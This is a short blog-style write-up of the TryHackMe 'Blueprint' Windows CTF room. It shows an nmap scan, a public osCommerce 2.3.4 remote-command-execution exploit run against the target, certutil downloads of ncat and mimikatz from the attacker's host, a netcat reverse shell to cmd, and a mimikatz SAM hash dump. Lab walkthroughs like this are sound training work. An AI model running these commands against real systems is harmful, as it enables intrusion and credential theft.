---
layout: post
title: Blueprint
date: 2023-02-13 12:00 +0700
categories: [THM, easy]
---

### Introduction

[Blueprint] is an easy Windows CTF machine on TryHackMe.
I completed the machine without using metasploit, but you can use It to completed too.

![blueprint](https://tryhackme-images.s3.amazonaws.com/room-icons/90243c256ba1d4eb403bc206e376f238.jpeg)



---

Let's start scaning the machine with nmap.

```sh
nmap -sSV -p- -open --min-rate 5000 <IP> -oN <outputfile.txt>
```

We can see like is normal in Windows machines to have a lot of ports open.

![Scan](/images/THM/blueprint/Captura.PNG)

This time we are going to focus on the web because we cannot see the SMB service as a guest.

![Web](/images/THM/blueprint/Captura2.PNG)

![exploit search](/images/THM/blueprint/Captura3.PNG)

```sh
python3 osCommerce2_3_4RCE.py http://<IP>:8080/osCommerce2_3_4/catalog/
```

![exploit execution](/images/THM/blueprint/Captura4.PNG)

```sh
certutil -urlcache -f http//<OUR IP>/<nc or ncat binary> <binary same name>
```

![ncat download](/images/THM/blueprint/Captura6.PNG)

```sh
certutil -urlcache -f http//<OUR IP>/mimikatz.exe mimikatz.exe
```

![mimikatz download](/images/THM/blueprint/Captura7.PNG)

```sh
nc.exe/ncat.exe <OUR IP> <PORT> -e cmd
```

![revshell](/images/THM/blueprint/Captura8.PNG)

```sh
mimikatz.exe
```

![mimikatz](/images/THM/blueprint/Captura9.PNG)

```sh
lsadump::sam
```

![Hashdump](/images/THM/blueprint/Captura10.PNG)

![cracked password](/images/THM/blueprint/Captura11.PNG)

```sh
dir C:\Users\Administrator\Desktop
type C:\Users\Administrator\Desktop\root.txt.txt
```

![root flag](/images/THM/blueprint/Captura5.PNG)

 [blueprint]: https://tryhackme.com/room/easyctf
 [crackstation]:https://crackstation.net/
 [exploit]:https://github.com/nobodyatall648/osCommerce-2.3.4-Remote-Command-Execution
